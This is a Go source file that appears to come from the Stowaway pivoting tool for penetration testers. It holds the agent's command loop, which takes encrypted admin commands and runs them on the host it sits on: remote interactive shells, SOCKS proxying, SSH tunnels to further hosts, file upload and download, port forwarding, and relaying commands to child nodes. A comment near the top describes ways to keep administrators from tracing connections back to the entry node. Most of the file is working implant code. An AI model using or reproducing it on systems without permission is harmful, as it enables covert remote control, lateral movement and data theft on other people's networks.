package agent

import (
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"Stowaway/node"
	"Stowaway/share"
	"Stowaway/utils"
)

//startnode启动代码
//todo:可以为startnode加入一个保护机制，在startnode启动时可以设置是否开启此机制
//即当有节点异常断线时，可设置是否让startnode暂时断开与第二级节点的连接
//防止异常断线是由于管理员发现节点引起的，并根据connection进行逐点反查从而顺藤摸瓜找到入口点startnode,使得渗透测试者失去内网的入口点
//先暂时不加入，权当一个胡思乱想的idea，今后可视情况增加对startnode保护机制的处理代码，使得入口点更加稳固和隐蔽

func HandleStartNodeConn(connToAdmin *net.Conn, monitor, listenPort, reConn string, passive bool, NODEID string) {
	go HandleConnFromAdmin(connToAdmin, monitor, listenPort, reConn, passive, NODEID)
	go HandleConnToAdmin(connToAdmin)
}

//管理startnode发往admin的数据
func HandleConnToAdmin(connToAdmin *net.Conn) {
	for {
		proxyData := <-ProxyChan.ProxyChanToUpperNode
		_, err := (*connToAdmin).Write(proxyData)
		if err != nil {
			continue
		}
	}
}

//管理admin端下发的数据
func HandleConnFromAdmin(connToAdmin *net.Conn, monitor, listenPort, reConn string, passive bool, NODEID string) {
	var (
		CannotRead = make(chan bool, 1)
		GetName    = make(chan bool, 1)
		stdin      io.Writer
		stdout     io.Reader
	)
	for {
		AdminData, err := utils.ExtractPayload(*connToAdmin, AgentStatus.AESKey, NODEID, false)
		if err != nil {
			AdminOffline(reConn, monitor, listenPort, passive)
			go SendInfo(NODEID) //重连后发送自身信息
			go SendNote(NODEID) //重连后发送admin设置的备忘
			continue
		}
		if AdminData.NodeId == NODEID {
			switch AdminData.Type {
			case "DATA":
				switch AdminData.Command {
				case "SOCKSDATA":
					SocksDataChanMap.RLock()
					if _, ok := SocksDataChanMap.Payload[AdminData.Clientid]; ok {
						SocksDataChanMap.Payload[AdminData.Clientid] <- AdminData.Info
						SocksDataChanMap.RUnlock()
					} else {
						SocksDataChanMap.RUnlock()
						SocksDataChanMap.Lock()
						SocksDataChanMap.Payload[AdminData.Clientid] = make(chan string, 1)
						go HanleClientSocksConn(SocksDataChanMap.Payload[AdminData.Clientid], SocksInfo.SocksUsername, SocksInfo.SocksPass, AdminData.Clientid, NODEID)
						SocksDataChanMap.Payload[AdminData.Clientid] <- AdminData.Info
						SocksDataChanMap.Unlock()
					}
				case "FILEDATA": //接收文件内容
					slicenum, _ := strconv.Atoi(AdminData.FileSliceNum)
					FileDataMap.Lock()
					FileDataMap.Payload[slicenum] = AdminData.Info
					FileDataMap.Unlock()
				case "FORWARD":
					TryForward(AdminData.Info, AdminData.Clientid)
				case "FORWARDDATA":
					ForwardConnMap.RLock()
					if _, ok := ForwardConnMap.Payload[AdminData.Clientid]; ok {
						PortFowardMap.Lock()
						if _, ok := PortFowardMap.Payload[AdminData.Clientid]; ok {
							PortFowardMap.Payload[AdminData.Clientid] <- AdminData.Info
						} else {
							PortFowardMap.Payload[AdminData.Clientid] = make(chan string, 1)
							go HandleForward(PortFowardMap.Payload[AdminData.Clientid], AdminData.Clientid)
							PortFowardMap.Payload[AdminData.Clientid] <- AdminData.Info
						}
						PortFowardMap.Unlock()
					}
					ForwardConnMap.RUnlock()
				case "FORWARDFIN":
					ForwardConnMap.Lock()
					if _, ok := ForwardConnMap.Payload[AdminData.Clientid]; ok {
						ForwardConnMap.Payload[AdminData.Clientid].Close()
						delete(ForwardConnMap.Payload, AdminData.Clientid)
					}
					ForwardConnMap.Unlock()
					PortFowardMap.Lock()
					if _, ok := PortFowardMap.Payload[AdminData.Clientid]; ok {
						if !utils.IsClosed(PortFowardMap.Payload[AdminData.Clientid]) {
							if !utils.IsClosed(PortFowardMap.Payload[AdminData.Clientid]) {
								close(PortFowardMap.Payload[AdminData.Clientid])
							}
							delete(PortFowardMap.Payload, AdminData.Clientid)
						}
					}
					PortFowardMap.Unlock()
				case "REFLECTDATARESP":
					ReflectConnMap.Lock()
					ReflectConnMap.Payload[AdminData.Clientid].Write([]byte(AdminData.Info))
					ReflectConnMap.Unlock()
				case "REFLECTTIMEOUT":
					fallthrough
				case "REFLECTOFFLINE":
					ReflectConnMap.Lock()
					if _, ok := ReflectConnMap.Payload[AdminData.Clientid]; ok {
						ReflectConnMap.Payload[AdminData.Clientid].Close()
						delete(ReflectConnMap.Payload, AdminData.Clientid)
					}
					ReflectConnMap.Unlock()
				case "FINOK":
					SocksDataChanMap.Lock() //性能损失？
					if _, ok := SocksDataChanMap.Payload[AdminData.Clientid]; ok {
						if !utils.IsClosed(SocksDataChanMap.Payload[AdminData.Clientid]) {
							close(SocksDataChanMap.Payload[AdminData.Clientid])
						}
						delete(SocksDataChanMap.Payload, AdminData.Clientid)
					}
					SocksDataChanMap.Unlock()
				case "FIN":
					CurrentConn.Lock()
					if _, ok := CurrentConn.Payload[AdminData.Clientid]; ok {
						CurrentConn.Payload[AdminData.Clientid].Close()
						delete(CurrentConn.Payload, AdminData.Clientid)
					}
					CurrentConn.Unlock()
					SocksDataChanMap.Lock()
					if _, ok := SocksDataChanMap.Payload[AdminData.Clientid]; ok {
						if !utils.IsClosed(SocksDataChanMap.Payload[AdminData.Clientid]) {
							close(SocksDataChanMap.Payload[AdminData.Clientid])
						}
						delete(SocksDataChanMap.Payload, AdminData.Clientid)
					}
					SocksDataChanMap.Unlock()
				case "HEARTBEAT":
					hbdatapack, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "KEEPALIVE", " ", " ", 0, NODEID, AgentStatus.AESKey, false)
					ProxyChan.ProxyChanToUpperNode <- hbdatapack
				default:
					continue
				}
			case "COMMAND":
				switch AdminData.Command {
				case "SHELL":
					switch AdminData.Info {
					case "":
						stdout, stdin = CreatInteractiveShell()
						go func() {
							StartShell("", stdin, stdout, NODEID)
						}()
					case "exit\n":
						fallthrough
					default:
						go func() {
							StartShell(AdminData.Info, stdin, stdout, NODEID)
						}()
					}
				case "SOCKS":
					socksinfo := strings.Split(AdminData.Info, ":::")
					SocksInfo.SocksUsername = socksinfo[1]
					SocksInfo.SocksPass = socksinfo[2]
					StartSocks()
				case "SOCKSOFF":
				case "SSH":
					err := StartSSH(AdminData.Info, NODEID)
					if err == nil {
						go ReadCommand()
					} else {
						break
					}
				case "SSHCOMMAND":
					go WriteCommand(AdminData.Info)
				case "SSHTUNNEL":
					err := SSHTunnelNextNode(AdminData.Info, NODEID)
					if err != nil {
						fmt.Println("[*]", err)
						break
					}
				case "CONNECT":
					var status bool = false
					command := strings.Split(AdminData.Info, ":::")
					addr := command[0]
					choice := command[1]
					if choice == "1" { //连接的节点是否是在reuseport？
						status = node.ConnectNextNodeReuse(addr, NODEID, AgentStatus.AESKey)
					} else {
						status = node.ConnectNextNode(addr, NODEID, AgentStatus.AESKey)
					}
					if !status {
						message, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "NODECONNECTFAIL", " ", "", 0, NODEID, AgentStatus.AESKey, false)
						ProxyChan.ProxyChanToUpperNode <- message
					}
				case "FILENAME":
					var err error
					UploadFile, err := os.Create(AdminData.Info)
					if err != nil {
						respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "CREATEFAIL", " ", " ", 0, NODEID, AgentStatus.AESKey, false)
						ProxyChan.ProxyChanToUpperNode <- respComm
					} else {
						respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "NAMECONFIRM", " ", " ", 0, NODEID, AgentStatus.AESKey, false)
						ProxyChan.ProxyChanToUpperNode <- respComm
						go share.ReceiveFile("", connToAdmin, FileDataMap, CannotRead, UploadFile, AgentStatus.AESKey, false, NODEID)
					}
				case "FILESIZE":
					filesize, _ := strconv.ParseInt(AdminData.Info, 10, 64)
					share.File.FileSize = filesize
					respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "FILESIZECONFIRM", " ", " ", 0, NODEID, AgentStatus.AESKey, false)
					ProxyChan.ProxyChanToUpperNode <- respComm
					share.File.ReceiveFileSize <- true
				case "FILESLICENUM":
					share.File.TotalSilceNum, _ = strconv.Atoi(AdminData.Info)
					respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "FILESLICENUMCONFIRM", " ", " ", 0, NODEID, AgentStatus.AESKey, false)
					ProxyChan.ProxyChanToUpperNode <- respComm
					share.File.ReceiveFileSliceNum <- true
				case "FILESLICENUMCONFIRM":
					share.File.TotalConfirm <- true
				case "FILESIZECONFIRM":
					share.File.TotalConfirm <- true
				case "DOWNLOADFILE":
					go share.UploadFile("", AdminData.Info, connToAdmin, utils.AdminId, GetName, AgentStatus.AESKey, NODEID, false)
				case "NAMECONFIRM":
					GetName <- true
				case "CREATEFAIL":
					GetName <- false
				case "CANNOTREAD":
					CannotRead <- true
					share.File.ReceiveFileSliceNum <- false
					os.Remove(AdminData.Info) //删除空文件
				case "FORWARDTEST":
					go TestForward(AdminData.Info)
				case "REFLECTTEST":
					go TestReflect(AdminData.Info)
				case "REFLECTNUM":
					ReflectStatus.ReflectNum <- AdminData.Clientid
				case "STOPREFLECT":
					ReflectConnMap.Lock()
					for key, conn := range ReflectConnMap.Payload {
						conn.Close()
						delete(ForwardConnMap.Payload, key)
					}
					ReflectConnMap.Unlock()

					for _, listener := range CurrentPortReflectListener {
						listener.Close()
					}
				case "LISTEN":
					err := TestListen(AdminData.Info)
					if err != nil {
						respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "LISTENRESP", " ", "FAILED", 0, NODEID, AgentStatus.AESKey, false)
						ProxyChan.ProxyChanToUpperNode <- respComm
					} else {
						respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "LISTENRESP", " ", "SUCCESS", 0, NODEID, AgentStatus.AESKey, false)
						ProxyChan.ProxyChanToUpperNode <- respComm
						go node.StartNodeListen(AdminData.Info, NODEID, AgentStatus.AESKey)
					}
				case "YOURINFO": //接收note
					AgentStatus.NodeNote = AdminData.Info
				case "KEEPALIVE":
				default:
					continue
				}
			}
		} else {
			// 检查是否是admin发来的，分配给自己子节点的ID命令，是的话将admin分配的序号记录
			if AdminData.Route == "" && AdminData.Command == "ID" {
				AgentStatus.WaitForIDAllocate <- AdminData.NodeId //将此节点序号递交，以便启动HandleConnFromLowerNode函数
				node.NodeInfo.LowerNode.Lock()
				node.NodeInfo.LowerNode.Payload[AdminData.NodeId] = node.NodeInfo.LowerNode.Payload[utils.AdminId]
				node.NodeInfo.LowerNode.Unlock()
			}
			routeid := ChangeRoute(AdminData) //更改路由并返回下一个路由点
			proxyData, _ := utils.ConstructPayload(AdminData.NodeId, AdminData.Route, AdminData.Type, AdminData.Command, AdminData.FileSliceNum, AdminData.Info, AdminData.Clientid, AdminData.CurrentId, AgentStatus.AESKey, true)
			passToLowerData := utils.NewPassToLowerNodeData()
			if routeid == "" { //当返回的路由点为0，说明就是自己的子节点
				passToLowerData.Route = AdminData.NodeId
			} else { //不是0，说明不是自己的子节点，还需要一定轮数的递送
				passToLowerData.Route = routeid
			}
			passToLowerData.Data = proxyData //封装结构体，交给HandleConnToLowerNode处理
			ProxyChan.ProxyChanToLowerNode <- passToLowerData
		}
	}
}
